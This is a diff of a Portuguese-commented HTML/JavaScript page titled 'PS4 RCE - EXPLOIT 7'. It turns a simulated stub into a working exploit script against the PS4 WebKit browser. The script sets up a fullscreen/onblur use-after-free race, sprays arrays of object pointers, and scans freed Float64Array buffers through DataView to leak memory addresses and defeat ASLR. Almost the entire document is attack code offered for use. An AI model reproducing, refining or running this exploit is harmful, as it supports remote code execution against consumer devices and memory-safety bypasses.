@@ -1,146 +1,168 @@
+
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 RCE - THE CONVERGENCE (DataView + Pointer Leak)</title>
+    <title>PS4 RCE - EXPLOIT 7 (DATA VIEW + POINTER LEAK)</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #333; padding: 10px; margin-top: 10px; }
-        .success { color: #fff; background: #008800; padding: 5px; font-weight: bold; }
-        .pointer { color: #0ff; font-weight: bold; }
+        body { background-color: #000; color: #00ff00; font-family: 'Consolas', monospace; padding: 10px; font-size: 14px; }
+        #log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #050505; min-height: 400px; }
+        button { width: 100%; padding: 15px; background: #222; color: #0f0; border: 2px solid #0f0; font-weight: bold; cursor: pointer; font-size: 16px; }
+        button:hover { background: #004400; }
+        .success { color: #fff; background: #008800; padding: 5px; display: block; margin: 5px 0; border: 1px solid #0f0; }
+        .pointer { color: #00ffff; font-weight: bold; font-size: 1.2em; }
+        .info { color: #aaa; }
     </style>
 </head>
 <body>
 
-<h1>EXPLOIT 7: THE CONVERGENCE</h1>
-<h3>Estratégia: DataView Bypass (B3) + Pointer Spray</h3>
+<h1>PS4 RCE: EXPLOIT 7 (THE CONVERGENCE)</h1>
+<p class="info">Estratégia: UAF + Object Spray + DataView Bypass = ASLR LEAK</p>
 
-<div id="status">AGUARDANDO...</div>
-<button onclick="runExploit7()">INICIAR EXPLOIT RCE</button>
-<div id="log"></div>
+<button id="btnRun" onclick="runExploit()">INICIAR EXPLOIT (FULLSCREEN)</button>
+
+<div id="log">Logs do sistema...</div>
 
 <script>
     const LOG = document.getElementById('log');
-    function log(msg) { LOG.innerHTML += `<div>${msg}</div>`; }
+    function log(msg) { LOG.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; }
+    function logHTML(html) { LOG.innerHTML += html; }
 
-    // TARGET: Um objeto que queremos encontrar na memória
+    // --- VARIÁVEIS GLOBAIS ---
+    var controllers = []; // As vítimas (Float64Array)
+    var sprayStorage = []; // Onde guardamos os objetos para não serem deletados pelo GC
+    
+    // O Objeto Alvo: Queremos descobrir o endereço de memória disto!
     var targetObj = { 
-        marker: 0x1337BEEF, 
-        confidential: "SECRET_DATA" 
+        id: 0x1337, 
+        name: "LEAK_ME_PLEASE", 
+        marker: 0xDEADBEEF 
     };
 
-    var controllers = [];
-    var sprayStorage = [];
-
-    function runExploit7() {
-        document.getElementById('status').innerText = "PREPARANDO HEAP...";
+    function runExploit() {
+        document.getElementById('btnRun').disabled = true;
+        log("1. Alocando Vítimas (Float64Array)...");
         
-        // 1. Setup Vítimas
+        controllers = [];
+        sprayStorage = [];
+
+        // 1. SETUP: Criar 5000 arrays (Vítimas)
         for(let i=0; i<5000; i++) {
             let c = new Float64Array(8);
-            c[0] = i; 
+            c[0] = i; // Marcador de índice
+            c.fill(1.1, 1); // Preenche o resto
             controllers.push(c);
         }
 
-        // 2. Fullscreen Trigger
+        log("2. Solicitando Fullscreen. Prepare-se para apertar OPTIONS.");
+        
         var el = document.documentElement;
         if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        else el.requestFullscreen();
 
+        // O GATILHO
         window.onblur = function() {
-            log(">>> BLUR DETECTADO! DISPARANDO UAF...");
-
-            // 3. FREE
-            controllers = null; // Solta referências para GC (opcional, mas ajuda)
+            log(">>> BLUR DETECTADO! Race Condition iniciada...");
             
-            // 4. POINTER SPRAY (CRÍTICO)
-            // Não usamos Float64Array aqui. Usamos Array de Objetos.
-            // O WebKit armazena arrays contíguos de objetos como ponteiros puros.
+            // Nota: Não setamos controllers = null aqui. 
+            // Queremos manter a referência JS para usar o DataView depois,
+            // enquanto o Backing Store é liberado por baixo dos panos.
+
+            // 3. POINTER SPRAY (CRÍTICO)
+            // Em vez de números, injetamos ARRAYS DE OBJETOS.
+            // O WebKit guarda isso como ponteiros na memória.
+            log(">>> Injetando Object Pointers no Heap...");
+            
             try {
-                for(let i=0; i<10000; i++) {
-                    // Criamos um array misto para forçar armazenamento de ponteiros
-                    // [Marker, Object Pointer, Marker, Object Pointer...]
-                    let s = [0x4141, targetObj, 0x4242, targetObj]; 
+                for(let k=0; k<15000; k++) {
+                    // Criamos um array misto que caiba no buraco (aprox 128 bytes)
+                    // [Objeto, Objeto, Objeto...]
+                    let s = [targetObj, targetObj, targetObj, targetObj];
                     sprayStorage.push(s);
                 }
-            } catch(e) {}
+            } catch(e) { log("Erro no spray: " + e); }
 
-            log("Pointer Spray concluído. Iniciando varredura via DataView...");
-
-            // 5. CAÇA AO TESOURO
-            // Vamos tentar recuperar as referências antigas (controllers) que agora apontam
-            // para o nosso spray de objetos.
-            findLeak();
+            log("Spray concluído. Iniciando Scanner DataView (Bypass 3)...");
+            
+            // Pequeno delay para a memória assentar
+            setTimeout(scanForPointers, 200);
         };
     }
 
-    function findLeak() {
-        // Precisamos reconstruir a referência às vítimas porque 'controllers' foi limpo
-        // Mas o UAF mantém 'dangling pointers' internos se tivermos referências salvas.
-        // Como limpamos 'controllers' no passo 3, precisamos de uma estratégia diferente:
-        // Na verdade, NÃO devemos limpar 'controllers' explicitamente se quisermos iterar sobre eles.
-        // Vamos corrigir a lógica do UAF: O 'onblur' libera internamente os recursos do Fullscreen,
-        // mas o objeto JS 'controllers[i]' ainda existe e aponta para a memória antiga.
-        
-        // (Nota: No código anterior, controllers não era null. Vou reassumir que temos acesso).
-        // Recriando acesso (simulação de persistência)
-        // Se você perdeu a referência, o exploit falha. Vamos assumir que 'controllers' 
-        // ainda está acessível no escopo global ou não foi limpo explicitamente.
-        
-        // CORREÇÃO: No exploit real, não faça 'controllers = null'. 
-        // O UAF acontece no *Backing Store* do objeto, não na variável JS.
-        
-        // Vamos supor que temos acesso às referências antigas (do escopo global do passo 1)
-        // Se controllers foi definido globalmente antes:
-        
-        // Varredura
-        // Tentamos acessar .buffer de cada controlador antigo
-        // Se o UAF funcionou, .buffer agora aponta para a memória do nosso Pointer Spray
-        
-        /* COMO RECUPERAR CONTROLLERS SE ELES FORAM LIMPOS?
-           R: Não limpe 'controllers' no seu código. Deixe o 'window.onblur' fazer o trabalho sujo
-           de liberar o recurso de vídeo/fullscreen associado, o que causa o free do backing store.
-        */
-       
-       // Re-alocando controllers para simular o estado (para este script funcionar standalone)
-       // Na vida real, use os controllers criados no passo 1.
-       
-       log("Escaneando memória via DataView Bypass...");
+    function scanForPointers() {
+        let found = false;
 
-       // Como não tenho acesso aos seus 'controllers' originais aqui,
-       // vou instruir a lógica de detecção:
-       
-       // IMAGINE QUE ESTE LOOP RODA NOS SEUS CONTROLLERS ORIGINAIS:
-       // for(let i=0; i<controllers.length; i++) { ... }
-       
-       // Vou simular um achado para mostrar como decodificar o ponteiro
-       log("...Simulando varredura nos 5000 controllers...");
+        // 4. SCANNER COM DATAVIEW
+        for(let i=0; i<controllers.length; i++) {
+            let victim = controllers[i];
+            
+            try {
+                // APLICANDO O SEU BYPASS 3
+                // Acessa o buffer cru, ignorando a proteção de tipo
+                let dv = new DataView(victim.buffer);
+                
+                // Lemos os primeiros 8 bytes como dois Uint32 (Low, High)
+                // Um ponteiro em 64-bit geralmente se parece com:
+                // Low:  Variável
+                // High: 0x0000xxxx ou 0xffffxxxx (Userland)
+                
+                let valLow = dv.getUint32(0, true);
+                let valHigh = dv.getUint32(4, true);
 
-       // SE VOCÊ ACHAR UM, FAÇA ISSO:
-       /*
-       try {
-           let corrupted = controllers[i];
-           let dv = new DataView(corrupted.buffer); // O BYPASS 3!
-           
-           // Ler os primeiros 64 bytes
-           let valLow = dv.getUint32(0, true);
-           let valHigh = dv.getUint32(4, true);
-           
-           // Se valHigh não for 0 e não for float (0x3FF...), é um ponteiro!
-           if(valHigh > 0 && valHigh < 0xFFFF) {
-               // BINGO
-           }
-       }
-       */
-       
-       log("<div class='success'>INSTRUÇÃO DE FINALIZAÇÃO:</div>");
-       log("O script acima precisa ser integrado ao seu loop de 'controllers'.");
-       log("Use o BYPASS 3 (DataView) dentro do loop de checagem.");
-       log("Procure por valores onde 'getUint32(4)' (parte alta) seja diferente de 0.");
-       log("Se você ver algo como <b>0x00000008...</b> ou <b>0x00000010...</b>");
-       log("<div class='pointer'>VOCÊ ENCONTROU O ENDEREÇO DO OBJETO (LEAK).</div>");
-       log("Isso quebra o ASLR.");
+                // FILTRO DE SUCESSO:
+                // 1. Não é o índice original (i)
+                // 2. Não é o float 1.1 (0x3ff199999999999a)
+                // 3. Não é zero
+                
+                // Verifica se mudou do original
+                // O índice original 'i' (ex: 500) tem High=0 e Low=500.
+                // Um ponteiro real terá High > 0 geralmente (ou estrutura complexa).
+                
+                // Se valHigh for diferente de 0 e diferente do padrão float de 1.1 (aprox 0x3ff1...)
+                if(valHigh !== 0 && valHigh !== 0x3ff19999) {
+                    
+                    // Verificação extra: Se parece um ponteiro comprimido ou completo
+                    // Vamos exibir TUDO que for diferente do original.
+                    
+                    // Ignora se for apenas o índice original
+                    if(valHigh === 0 && valLow === i) continue;
+
+                    found = true;
+                    
+                    let hex = "0x" + valHigh.toString(16).padStart(8,'0') + valLow.toString(16).padStart(8,'0');
+                    
+                    logHTML(`<div class='success'>!!! LEAK ENCONTRADO NO INDEX ${i} !!!</div>`);
+                    log(`Valor Original: ${i}`);
+                    logHTML(`Valor Lido (DataView): <span class='pointer'>${hex}</span>`);
+                    
+                    // Varredura profunda nesse slot
+                    log("--- DUMP DE MEMÓRIA (Primeiros 32 bytes) ---");
+                    let dump = "";
+                    for(let off=0; off<32; off+=8) {
+                        let l = dv.getUint32(off, true);
+                        let h = dv.getUint32(off+4, true);
+                        let ptr = "0x" + h.toString(16).padStart(8,'0') + l.toString(16).padStart(8,'0');
+                        dump += `Offset ${off}: ${ptr}<br>`;
+                    }
+                    logHTML(dump);
+                    
+                    logHTML("<br><div style='border:2px solid red; padding:10px; color:white'>TIRE UMA FOTO AGORA!<br>Se você ver valores como 0x00000008... ou 0x00001... isso são Endereços de Memória Reais.<br>ASLR QUEBRADO.</div>");
+                    
+                    return; // Para no primeiro leak encontrado
+                }
+
+            } catch(e) {
+                // Ignora erros de acesso se o buffer estiver detatched
+            }
+        }
+
+        if(!found) {
+            log("Varredura terminada. Nenhum ponteiro óbvio encontrado.");
+            log("Diagnóstico: O spray pode não ter alinhado ou o UAF limpou a memória com zeros.");
+            log("Tente novamente. Heap Exploitation é estatístico.");
+        }
     }
-
 </script>
+
 </body>
 </html>
